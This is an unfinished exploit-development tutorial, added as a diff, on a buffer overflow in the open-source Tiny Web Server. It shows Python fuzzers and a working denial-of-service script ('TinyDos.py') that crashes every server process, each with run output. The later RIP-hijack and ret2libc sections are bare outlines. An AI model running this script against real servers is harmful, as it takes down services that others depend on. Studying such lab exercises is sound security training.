@@ -1,0 +1,357 @@
+!!!!!!!!!! From Bug to Exploit - Tiny Web Server !!!!!!!!!! 
+
+!!!!!!!!!! TinyWebServer- Our Target !!!!!!!!!! 
+In Intro to Buffer Overflows, we made a basic proof-of-concept program that accepted input we could overflow, and if not abused would have returned a simple greeting with the name supplied in the input. The input we used to trigger the buffer overflow and spawn a shell consisted of the bytes the processor needed to be supplied with in order to execute the payload correctly. In other words, the executable code was written directly onto the stack. Several things have been done in order to mitigate this, such as stack canaries, ASLR, and making the stack non-executable. This next section will focus on not only finding an exploitable bug in a program not specifically made to be exploited, but on how to run code when you can't execute anything you write to the stack. We'll disable ASLR first, and then re-enable it and find out how to get around it.
+
+The server we will be using for this section is "Tiny Web Server", located at https://github.com/shenfeng/tiny-web-server. The source code is compiled with "gcc -Wall -z noexecstack -fno-stack-protector -o tiny tiny.c", to compile it in 32-bit code, disable the stack canary, and make the stack non-executable. Then, we run it with "./tiny" with no arguments, and it gives the following output:
+
+=======================================================
+
+listen on port 9999, fd is 3
+child pid is 13773
+child pid is 13774
+child pid is 13775
+child pid is 13776
+child pid is 13777
+child pid is 13778
+child pid is 13779
+child pid is 13780
+child pid is 13781
+child pid is 13782
+
+=======================================================
+
+Testing out the webserver, we can navigate to 127.0.0.1:9999 to make sure it's working:
+
+=======================================================
+
+tiny.c	2013-03-19 20:15	12.9K
+Makefile	2013-03-19 20:15	138
+README.md	2013-03-19 20:15	1.0K
+tiny	2018-10-13 23:27	17.3K
+
+=======================================================
+
+Upon receiving the request, the output of the terminal has changed to this:
+
+=======================================================
+
+listen on port 9999, fd is 3
+child pid is 13773
+child pid is 13774
+child pid is 13775
+child pid is 13776
+child pid is 13777
+child pid is 13778
+child pid is 13779
+child pid is 13780
+child pid is 13781
+child pid is 13782
+accept request, fd is 4, pid is 13772
+127.0.0.1:49518 200 - .
+
+=======================================================
+
+This tells us some important things. First, without auditing the code, the function of the server is simply to act as a browser-based interface to access the contents of the folders nested within the one containing the tiny web server. If we navigate to 127.0.0.1:9999/tiny.c, we'd be reading the source file of the tiny web server. If we attempt to navigate to a file or folder that doesn't exist, the server returns us a simple string of text: "File not found". 
+
+Now that we have poked around the server enough to know what it's supposed to do, we can begin to try breaking it. As an end user, the only intended interaction with this server is through accessing URI's of the intended path. Since we can access URI's of any length, we can use this approach to try and trigger a buffer overflow. 
+
+Manually fuzzing is a valuable exercise. A hacker's tools should be an assistance, not a cruch. NOT having access to your tools shouldn't mean that you CAN'T do anything, it should mean that it would be painfully slow to do so. It's more than okay to use tools like NMAP and Metasploit, but if you only know how to port scan if you have NMAP, you don't really know how to port scan. In real life engagements, you don't always have access to the tools you're used to and comfy with, sometimes all you have is python and gcc. The tools I write in this tutorial aren't elegant and nice -- they are barebones minimal, doing only what's absolutely necessary to make sense and perform properly. One could easily modify these scripts to look nicer and parse output from curl and such, but the focus here is on functionality.
+
+As a master of machines, you should be using machines for the way they were intended: to automate simple tasks, and perform them faster. This section will start out with manually fuzzing the URI by accessing it through the browser, then we'll whip up a quick and dirty python script to automate the same process. Finally, we'll improve on it to locate the exact number of bytes we can send before triggering an overflow, giving us a start for our our exploit development. 
+
+ !!!!!!!!!! SLOW AND HARD !!!!!!!!!! 
+
+For this exercise, we're going to keep our web browser open and simply access longer and longer URI's. Since I'm accessing it from the same machine I'm hosting it on, I simply start with "127.0.0.1:9999/". Type the letter "A" 10 times. AAAAAAAAAA. Copy it. Paste it 5 times. You now have 50 "A"'s. Put that at the end of the URI and access "127.0.0.1:9999/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA". You should get a "File not found" error, just like we'd expect. Paste another 50 "A"'s. Repeat. Repeat. Repeat. You will, eventually, stop getting a "File not found" error and get an "Empty Response" error. The server has stopped sending data back, but it's still running. We don't have to restart our server to keep fuzzing it-- yet. 
+
+While we're manually fuzzing it, we may as well try to figure out why we are still able to access the server after we caused a buffer overflow. Afterall, in previous exercises, buffer overflows caused a segmentation fault and crashed the program, but that's not the observed behavior here. If the program isn't even crashing, can we be sure that there IS a buffer overflow taking place?
+
+Pull up the terminal you are running the TinyWebServer in, and let's examine the server output. When the server accepts a request, it prints out that it accepted a request, and which process ID accepted it. The next line outputs the IP address that requested it, the HTTP status code, and the requested path. Requesting the root directory returns us a status code of 200, requesting the buffer full of "A"'s returns 404. You should see the output from the server repeatedly serving 404's for the fuzzing strings, up until the last one it prints before it stops responding. This string is different from the others, in that it truncates with "=������" instead of "A"'s. This tells us that we are, in fact, triggering a buffer overflow.
+
+ !!!!!!!!!! FUZZING FAST AND EASY !!!!!!!!!! 
+
+In order to automate this process and do it lightning quick, we're going to write a python script to automate the fuzzing process. The following code will go into our first fuzzer, urifuzzer.py.
+
+
+=======================================================
+
+from os import system
+
+print """
+URI Fuzzer - a Python script to fuzz servers by sending increasingly long URI's to the target server.
+
+Currently this does not support custom payloads/inputs\n
+"""
+target = raw_input("Please input the target URI:\n>")
+port = raw_input("Input the target port:\n>")
+buflen = int(raw_input("Input the buffer length to be added with each iteration:\n>"))
+iters = int(raw_input("Input number of iterations to perform:\n>"))
+buf = "A"*buflen
+
+for i in range(iters):
+    print "\nPerforming iteration number %s of %s" % (i, iters)
+    payload = buf * i
+    print "Sending URI with buffer length of %s" % len(payload)
+    comm = "/usr/bin/curl " + str(target) + ":" + str(port) + "/\"" + str(payload) + "\""
+    system(comm)
+
+=======================================================
+
+This simple fuzzer only asks for the target input, target port, the number of A's you add on to the URI to fuzz it each time, and how many times you want to add them. Instead of anything fancy, or anything that will stop it when it hit's the overflow, we're strictly automating what we already did. Kill the server process, restart it, and fire up your fuzzer. In this example, we add 50 bytes to the buffer we send 25 times, and we get interesting output in both the terminal for our fuzzer and the one running the server. First, let us examine the output from the fuzzer:
+
+=======================================================
+
+URI Fuzzer - a Python script to fuzz servers by sending increasingly long URI's to the target server.
+
+Currently this does not support custom payloads/inputs
+
+
+Please input the target URI:
+>127.0.0.1
+Input the target port:
+>9999
+Input the buffer length to be added with each iteration:
+>50
+Input number of iterations to perform:
+>25
+
+Performing iteration number 0 of 25
+Sending URI with buffer length of 0
+<html><head><style>body{font-family: monospace; font-size: 13px;}td {padding: 1.5px 6px;}</style></head><body><table>
+<tr><td><a href="tiny.c">tiny.c</a></td><td>2013-03-19 20:15</td><td>12.9K</td></tr>
+<tr><td><a href="Makefile">Makefile</a></td><td>2013-03-19 20:15</td><td>138</td></tr>
+<tr><td><a href="README.md">README.md</a></td><td>2013-03-19 20:15</td><td>1.0K</td></tr>
+<tr><td><a href="tiny">tiny</a></td><td>2018-10-13 23:27</td><td>17.3K</td></tr>
+</table></body></html>
+Performing iteration number 1 of 25
+Sending URI with buffer length of 50
+File not found
+Performing iteration number 2 of 25
+Sending URI with buffer length of 100
+File not found
+Performing iteration number 3 of 25
+Sending URI with buffer length of 150
+File not found
+Performing iteration number 4 of 25
+Sending URI with buffer length of 200
+File not found
+Performing iteration number 5 of 25
+Sending URI with buffer length of 250
+File not found
+Performing iteration number 6 of 25
+Sending URI with buffer length of 300
+File not found
+Performing iteration number 7 of 25
+Sending URI with buffer length of 350
+File not found
+Performing iteration number 8 of 25
+Sending URI with buffer length of 400
+File not found
+Performing iteration number 9 of 25
+Sending URI with buffer length of 450
+File not found
+Performing iteration number 10 of 25
+Sending URI with buffer length of 500
+File not found
+Performing iteration number 11 of 25
+Sending URI with buffer length of 550
+File not found
+Performing iteration number 12 of 25
+Sending URI with buffer length of 600
+curl: (52) Empty reply from server
+
+Performing iteration number 13 of 25
+Sending URI with buffer length of 650
+curl: (52) Empty reply from server
+
+Performing iteration number 14 of 25
+Sending URI with buffer length of 700
+curl: (52) Empty reply from server
+
+Performing iteration number 15 of 25
+Sending URI with buffer length of 750
+curl: (52) Empty reply from server
+
+Performing iteration number 16 of 25
+Sending URI with buffer length of 800
+curl: (52) Empty reply from server
+
+Performing iteration number 17 of 25
+Sending URI with buffer length of 850
+curl: (52) Empty reply from server
+
+Performing iteration number 18 of 25
+Sending URI with buffer length of 900
+curl: (52) Empty reply from server
+
+Performing iteration number 19 of 25
+Sending URI with buffer length of 950
+curl: (52) Empty reply from server
+
+Performing iteration number 20 of 25
+Sending URI with buffer length of 1000
+curl: (52) Empty reply from server
+
+Performing iteration number 21 of 25
+Sending URI with buffer length of 1050
+curl: (52) Empty reply from server
+
+Performing iteration number 22 of 25
+Sending URI with buffer length of 1100
+curl: (7) Failed to connect to 127.0.0.1 port 9999: Connection refused
+
+Performing iteration number 23 of 25
+Sending URI with buffer length of 1150
+curl: (7) Failed to connect to 127.0.0.1 port 9999: Connection refused
+
+Performing iteration number 24 of 25
+Sending URI with buffer length of 1200
+curl: (7) Failed to connect to 127.0.0.1 port 9999: Connection refused
+
+=======================================================
+
+We get 4 specific outputs from our fuzzer:
+
+The first is from Iteration 0. We could program our fuzzer to start at one, but I kept it like this to demonstrate what receiving a webpage is supposed to look like. The fuzzer informs us it's sending nothing in the buffer, essentially accessing "127.0.0.1:9999/". Since this is a valid path, we are served the tiny webpage merely listing links to the other files in the directory. The output of curl from this python script is the resultant HTML of the page, and the fuzzer outputs this. This is actually the basis of how to write a crawler- a program that crawls webpages and scrapes it for specific types of data. 
+
+Next, we have iterations 1-11. These consist of the buffer of A's up until there are 550 of them. With less than 550 bytes in our buffer, we do not trigger an overflow, and the server responds with "File not found".
+
+Iterations 12-21 (buffers containing over 600 bytes) cause a different kind of error: curl: (52) Empty reply from server. Here, we are triggering the buffer overflow, but for some reason, we are still able to make requests to the server and the server is still able to respond if it's a request with less than 550 bytes in the request. 
+
+Iterations 22 and above are the final type of output from our fuzzer: curl: (7) Failed to Connect: Connection Refused. Here, the server has crashed in it's entirety and they can no longer make requests to the server. 
+
+Now, we examine the output in the other terminal that we were running the tiny server in, and get the other half of this story. When the server begins, it starts by outputting the port it's running on, then spawns a bunch of child processes and tells us each process ID. When we make a request to the server, it tells us it accepted a request, and which process ID accepted it. When the buffer overflow crashes that process, the output is only of the accepted request and process ID and it never gets the chance to tell us which IP requested the path, the status code or what the path was. That's why you should see a series of "accept request" lines without anything in between once we start crashing it, instead of the strings we were sending before triggering the overflow. 
+
+Despite causing segmentation faults (as an overflow does), we should only see one instance of Segmentation fault (core dumped) in the output. The terminal returns control to us, even though it may continue to print output from the server as other child processes accept requests. If you look closely, you'll see that the process ID handling the request that tells us Segmentation Fault (core dumped) is listed as one of the child process IDs. 
+
+This means that the server begins in our terminal, and starts up 10 child processes. The parent and child processes handle requests. When we send a buffer of 600 bytes, we crash whichever server process handled that request. The terminal only says Segmentation Fault if we crash the parent process, and returns control to us. The child processes will still output to the server, until they are all crashed. Once all 10 of the server processes crash, the server is down.
+
+ !!!!!!!!!! YOUR FIRST DENIAL OF SERVICE EXPLOIT !!!!!!!!!! 
+
+While we haven't done a deep enough dive to make this executable yet, this does give us all the ammo we need to build a simple Denial-of-Service exploit. Using python again, we can easily throw together a script that sends 10 buffers of at least 600 bytes to the server, crashing all of the processes and bringing down the server. We can easily make a quick and dirty implementation by slightly modifying the URIFuzzer python file:
+
+=======================================================
+
+from os import system
+
+print """
+TinyDos.py- a simple Denial-of-Service script for TinyWebServer. 
+"""
+target = raw_input("Please input the target URI:\n>")
+port = raw_input("Input the target port:\n>")
+buflen = int(raw_input("Input the buffer length required to crash the server:\n>"))
+iters = int(raw_input("Input number of times to send evil buffer to crash the server:\n>"))
+
+for i in range(iters-1):
+    print "Sending evil buffer number %s of %s" % (i+1, iters)
+    comm = "/usr/bin/curl " + str(target) + ":" + str(port) + "/\"" + str("A"*buflen) + "\""
+    system(comm)
+    
+=======================================================
+
+Put in your target IP and port, and as long as we can send at least 600 bytes, we can crash the process. We have 10 child processes and 1 parent process, for a total of 11 processes to crash. Here, we will tell the TinyDOS script to send a total of 12 buffers. The first 11 should give us an error about getting an empty reply from the server, as it crashes each process. The 12th buffer we send should get to a completely crashed server with nothing running to recieve our request, and we should not even get an empty response, but a "Connection refused" error:
+
+=======================================================
+
+TinyDos.py- a simple Denial-of-Service script for TinyWebServer. 
+
+Please input the target URI:
+>127.0.0.1
+Input the target port:
+>9999
+Input the buffer length required to crash the server:
+>600
+Input number of times to send evil buffer to crash the server:
+>12
+Sending evil buffer number 1 of 12
+curl: (52) Empty reply from server
+Sending evil buffer number 2 of 12
+curl: (52) Empty reply from server
+Sending evil buffer number 3 of 12
+curl: (52) Empty reply from server
+Sending evil buffer number 4 of 12
+curl: (52) Empty reply from server
+Sending evil buffer number 5 of 12
+curl: (52) Empty reply from server
+Sending evil buffer number 6 of 12
+curl: (52) Empty reply from server
+Sending evil buffer number 7 of 12
+curl: (52) Empty reply from server
+Sending evil buffer number 8 of 12
+curl: (52) Empty reply from server
+Sending evil buffer number 9 of 12
+curl: (52) Empty reply from server
+Sending evil buffer number 10 of 12
+curl: (52) Empty reply from server
+Sending evil buffer number 11 of 12
+curl: (7) Failed to connect to 127.0.0.1 port 9999: Connection refused
+
+=======================================================
+
+While we can certainly clean up the script and make the output nicer, this is simply a quick and dirty implementation that works-- your very first Denial-of-Service exploit. 
+
+ !!!!!!!!!! DIVE DEEPER 1 -- HIJACKING THE RIP !!!!!!!!!! 
+
+So far, we've compiled our target, abused the input we can send to it until it crashed, and wrote a pair of python scripts to automate what we were doing manually. We can reliably crash the server if we send no more than 11 malicious buffers. But we aren't here to crash servers, are we? We're here to hijack them, to take control and force them to execute the code we want in a way it was never meant to do. At a certain point between 550 and 600 bytes, we start to overwrite the RIP. So our next step is finding out exactly how many bytes we can write before hijacking the RIP. Again, we can modify our urifuzzer.py file to the following, having it add one byte at a time in the range we've already narrowed down. 
+
+=======================================================
+
+from os import system
+
+print """
+URI Fuzzer - a Python script to fuzz servers by sending increasingly long URI's to the target server.
+
+Currently this does not support custom payloads/inputs\n
+"""
+target = raw_input("Please input the target URI:\n>")
+port = raw_input("Input the target port:\n>")
+start = int(raw_input("Input the buffer length to begin with:\n>"))
+end = int(raw_input("Input the buffer length to end on:\n>"))
+
+iters = int(end) - int(start)
+
+for i in range(iters):
+    payload = "A"*(int(start) + int(i))
+    print "\nSending URI with buffer length of %s" % len(payload)
+    comm = "/usr/bin/curl " + str(target) + ":" + str(port) + "/\"" + str(payload) + "\""
+    system(comm)
+
+=======================================================
+
+We know from fuzzing earlier that the overflow happens somewhere between 550 and 600 bytes, so that's what I put into the fuzzer. The output came out as such:
+
+=======================================================
+
+Sending URI with buffer length of 550
+File not found
+Sending URI with buffer length of 551
+File not found
+Sending URI with buffer length of 552
+curl: (52) Empty reply from server
+
+=======================================================
+
+We have our answer almost immediately, we should start overwriting our RIP at 552 bytes. We've gotten pretty far without the use of GDB, but in order to hijack the execution flow, it's time to fire up the debuggers and pick through the nitty gritty binary to take control of the program.
+
+
+
+>LOAD GDB AND CRASH IT HERE
+
+
+
+The problem we encounter here is that while triggering a buffer overflow, we get a segmentation fault from inside of a legitimate function. The RIP isn't being overwritten...or is it? Seeing "Segmentation fault (core dumped)" at a legitimate address instead of at 0x41414141 was confusing at first. What's actually happening here? Is this bug not exploitable aside from a DoS? The server was crashing at a simple mov instruction, not while trying to make a system call or execute something in the non-executable stack. Since we know where we crash, we should fire up our debugger, load the server in it, crash it, and start working backwards. Since I hadn't overwritten the RIP, it was worth looking back to see where I HAD overwritten. Examining the registers with "info registers", I can see that the EAX is overwritten with 0x41414141. 
+>EAX NOT OUR TARGET, LOOK AT BACKTRACE
+>SEE BACKTRACES OVERWRITTEN
+>BACKTRACE IS ACTUALLY THE STACK
+>LOCATE WHERE IN STACK BACKTRACES ARE
+>UNIQUE STRING TO LOCATE LENGTH
+>OVERWRITE RIP WITH 0xDEADBEEF
+>PoC Ret2Exit()
+>RET2LIBC EXPLOIT
+
+
+
+
+>FOLLOW IT IN GDB DISSASSEMBLER
+>ret2libc exit
+>spawn shell ropchain
